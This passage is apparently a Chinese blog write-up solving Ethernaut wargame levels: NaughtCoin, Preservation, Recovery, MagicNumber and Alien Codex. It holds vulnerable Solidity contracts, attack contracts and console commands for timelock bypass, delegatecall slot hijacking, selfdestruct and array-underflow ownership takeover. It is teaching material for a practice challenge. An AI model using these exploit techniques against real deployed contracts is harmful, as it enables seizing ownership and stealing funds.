&#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将您的代币余额变成零。</p>
<p>乍一看上去，由于十年期限的限制，我们无法使用<code>transfer</code>进行转账，但是实际上该代币是<code>ERC20</code>代币的实现，该代币接口中有一个授权转账的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender &#x3D; _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance &#x3D; allowance(owner, spender);</span><br><span class="line">        if (currentAllowance !&#x3D; type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;&#x3D; amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是使用该函数有个前提条件，即<code>msg.sender</code>要获得<code>from</code>的授权，授权代币额度大于等于<code>amount</code>。</p>
<p>因此我们要给自己授权，该函数实现如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner &#x3D; _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>spender</code>是被授权方。</p>
<p>因此依次在控制台输入如下即可：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="string">'1000000000000000000000000'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">'0x34a2Bdc713002B5b7c80F20233b306977aD3B64E'</span>,<span class="string">'1000000000000000000000000'</span>)</span><br></pre></td></tr></table></figure>

<p><code>0x34a2Bdc713002B5b7c80F20233b306977aD3B64E</code>是一个合法的第三方账户。</p>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>我们先来回顾一下<code>delegatecall</code>的用法</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>实际上，你可以粗略地理解成我们把目标合约的函数代码给拿了过来，放在我们当前合约中执行，修改的是当前合约的变量，相当于引入库函数的功能。</p>
<p>我们先来看一下<code>Preservation</code>合约的存储：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone1Library (20)| &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone2Library (20)| &lt;- slot 1</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) |       owner (20)     | &lt;- slot 2</span><br><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 3</span><br><span class="line">---------------------------------------</span><br><span class="line">|    unused (28) |setTimeSignature (4)| &lt;- slot 4</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>再来看看<code>LibraryContract</code>合约的存储：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>由于变量<code>storedTime</code>在<code>LibraryContract</code>合约中，是在<code>slot 0</code>的位置，因此当<code>Preservation</code>调用<code>setFirstTime</code>的时候，由于<code>delegatecall</code>的特性，修改的是其<code>slot 0</code>处的变量，即变量<code>timeZone1Library</code>，也就是说，我们可将其设置为一个恶意地址，指向一个恶意合约，然后恶意中修改<code>owner</code>变量即可。</p>
<p>攻击合约如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address public foo1;</span><br><span class="line">  address public foo2;</span><br><span class="line">  address public storedTime; </span><br><span class="line"></span><br><span class="line"> function setTime(uint _time) public &#123;</span><br><span class="line"> &#x2F;&#x2F; storedTime 是在 slot 2 的位置，因此将来修改的是 owner</span><br><span class="line">    storedTime &#x3D; address(uint160(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先部署上述合约，获得其地址<code>0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD</code>，然后在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">'0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD'</span>)</span><br></pre></td></tr></table></figure>

<p>再调用函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(player)</span><br></pre></td></tr></table></figure>

<p>即可完成修改。</p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：找回已部署的<code>SimpleToken</code>合约。</p>
<p> 该关卡考察的应该是如何根据合约地址去追踪历史交易。</p>
<p>我们先在控制台输入<code>instance</code>，获取关卡实例地址，注意，这不是合约<code>SimpleToken</code>的地址，得到该实力地址以后，打开浏览器，输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sepolia.etherscan.io&#x2F;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我用的是sepolia测试网，如果使用的是其他测试网，要相应地修改地址</p>
</blockquote>
<p>输入实力地址，并选择internal transaction，找到最新的记录</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230304132643.png" alt></p>
<p>点击【Contract Creation】，进去后得到一个地址<code>0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f</code>，而且该地址账户拥有0.001ether，实际上该地址就是我们要找的合约地址，我们只要调用该地址上面的<code>destroy</code>函数即可，我们可用通关部署一下合约进行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">&#x2F;&#x2F; 在控制台输入  player 获得对应地址</span><br><span class="line">  constructor(address _player)&#123;</span><br><span class="line">  </span><br><span class="line">  	address(0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f).call(</span><br><span class="line">  		abi.encodeWithSignature(&quot;destroy(address)&quot;, _player)</span><br><span class="line">  	);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：部署一个合约</p>
<p>我们需要部署一个合约<code>Solver</code>，该合约中会返回一个数字，和<code>whatIsTheMeaningOfLife()</code>对应，实际上是42（<del>别问我怎么知道，问就是网友说的</del>）.还要要求该合约中的字节码不超过10个。</p>
<p>本关卡好难，直接去网上看别人的做法！</p>
<blockquote>
<p>参考链接<a href="https://paper.seebug.org/790/" target="_blank" rel="noopener">【以太坊智能合约静态分析】</a>、<a href="https://www.ethervm.io/" target="_blank" rel="noopener">【ethervm.io】</a>【<a href="https://xz.aliyun.com/t/11159#toc-9】" target="_blank" rel="noopener">https://xz.aliyun.com/t/11159#toc-9】</a></p>
</blockquote>
<p>智能合约编译后的字节码，分为三个部分：部署代码、runtime代码、auxdata。</p>
<p>当然，auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行。</p>
<p>以太坊虚拟机在创建合约的时候，会先创建一个合约账户，然后运行部署代码。运行完成后它会将<strong>runtime代码+auxdata 存储到区块链上</strong>。之后再把二者的存储地址跟合约账户关联起来(也就是把合约账户中的code hash字段用该地址赋值)，这样就完成了合约的部署。而我们本关卡主要是从runtime代码入手。</p>
<p>如果我们要返回42，则最后的字节码必须是<code>RETURN</code>，使用该字节码时候，将会依次从栈中取两个元素，作为偏移量<code>offset</code>和长度<code>length</code>，最终返回的内容是<code>memory[offset:offset+length]</code>，因此我们要在<code>RETURN</code>上面将偏移量和长度写进栈中，然后在此之上，再写入42到内存<code>memory</code>中。具体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    602a                 PUSH1 0x2a</span><br><span class="line">0002    6050                 PUSH1 0x50</span><br><span class="line">0004    52                   mstore</span><br><span class="line">0007    6020                 PUSH1 0x20</span><br><span class="line">0009    6050                 PUSH1 0x50</span><br><span class="line">000B    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>前三行是写入42，后三行是设置<code>return</code>的内容.设置偏移量为<code>0x50</code>是因为我们的低部分位置放了代码。</p>
<p>上述的汇编作为<code>runtime</code>代码，刚好10个字节，即10个<code>opcode</code>（以太坊中，一个字节码占用一个字节）。</p>
<p>下一步，我们要通过部署代码，将<code>runtime</code>代码写入区块链；在部署代码这一块，写入代码需要使用<code>CODECOPY</code>，该操作码会依次从栈中取出三个操作数<code>destOffset</code>、<code>offset</code>、<code>length</code>，即完成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory[destOffset:destOffset+length] &#x3D; msg.data[offset:offset+length]</span><br></pre></td></tr></table></figure>

<p>因此这一段的汇编如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            PUSH1 0x0a</span><br><span class="line">0002    600c            PUSH1 0x0c</span><br><span class="line">0004    6000            PUSH1 0x00</span><br><span class="line">0006    39              CODECOPY</span><br><span class="line">0007    600a            PUSH1 0x0a</span><br><span class="line">0009    6000            PUSH1 0x00</span><br><span class="line">000B    F3              RETURN</span><br></pre></td></tr></table></figure>

<p>第一次<code>push</code>的是<code>0x0a</code>，这是runtime代码的长度，第二次<code>push</code>的是<code>0x0c</code>，是因为我们的部署代码的长度是12个字节，我们将<code>runtime</code>代码附在部署代码后面，则<code>runtime</code>代码的偏移量是<code>0x0c</code>，第三次<code>push</code>的是<code>0x00</code>，是因为我们打算将我们的<code>runtime</code>代码保存到内存<code>memory</code>的<code>slot 0</code>处。最后是将<code>memory</code>的空间扩展到<code>len=0x0a</code>(如果之前不足的话) 并返回部署后的字节码.最终的汇编如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            	PUSH1 0x0a</span><br><span class="line">0002    600c            	PUSH1 0x0c</span><br><span class="line">0004    6000            	PUSH1 0x00</span><br><span class="line">0006    39              	CODECOPY</span><br><span class="line">0007    600a            	PUSH1 0x0a</span><br><span class="line">0009    6000            	PUSH1 0x00</span><br><span class="line">000B    F3              	RETURN</span><br><span class="line">000C    602a                 PUSH1 0x2a</span><br><span class="line">000E    6050                 PUSH1 0x50</span><br><span class="line">0010    52                   mstore</span><br><span class="line">0011    6020                 PUSH1 0x20</span><br><span class="line">0013    6050                 PUSH1 0x50</span><br><span class="line">0015    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>即<code>600a600c600039600a6000F3602a60505260206050F3</code>是我们要部署的内容。</p>
<p>我们在控制台输入一下代码即可：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">byteCode = <span class="string">"600a600c600039600a6000F3602a60505260206050F3"</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: byteCode&#125;)</span><br><span class="line"><span class="comment">// 将会返回contract地址，假设为0x01</span></span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">'0x01'</span>)</span><br></pre></td></tr></table></figure>

<p>然后提交即可。</p>
<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;helpers&#x2F;Ownable-05.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact &#x3D; true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] &#x3D; _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>乍一看上去，没有修改合约所有权的函数，实际上，该合约继承了<code>Ownable</code>合约，该合约可以<a href="https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol" target="_blank" rel="noopener">【此】</a>查看，实际上，就算我们不查看该合约，我们也可以依次在控制台输入一下代码，查看相关存储布局：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br><span class="line"><span class="keyword">await</span> contract.make_contact()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br></pre></td></tr></table></figure>

<p>就会发现，实际上该合约的存储结构中，第一个<code>slot</code>的布局如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">|      unused(11)      |contact(1) |        owner (20)       | &lt;- slot 0</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>再次查看<code>revise</code>函数，支持写入<code>codex</code>的某个位置，我们还注意到<code>retract</code>函数，是直接将动态长度减去1，实际上<code>slodity</code>这里并没有对动态数组长度做<strong>溢出检查</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.retract()</span><br><span class="line">await web3.eth.getStorageAt(instance, &quot;1&quot;)</span><br><span class="line"># return &#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>slot 1 存储的是动态数组codex的长度，关于动态数组中元素的位置，参照<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官网文档-状态变量在储存中的布局】</a></p>
</blockquote>
<p>由于我们的<code>codex</code>变量目前是和<code>slot 1</code>相关联，而动态数组的元素存储位置会从 <code>keccak256(p)</code> 开始，<code>p</code>是<code>slot index</code>，本关卡是1，此外， 它的布局方式与静态大小的数组相同。一个元素接着一个元素。</p>
<p>我们借助remix，写个计算<code>keccak256</code>的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function keccak256Helper(uint p) public pure returns(bytes32 res) &#123;</span><br><span class="line">        res &#x3D; keccak256(abi.encodePacked(p));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keccak256(1)&#x3D;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>

<p>该地址即为<code>codex</code>中元素的起始地址</p>
<p>借助<code>python</code>，我们可以计算一个偏移地址，使得偏移后的地址指向0，即：</p>
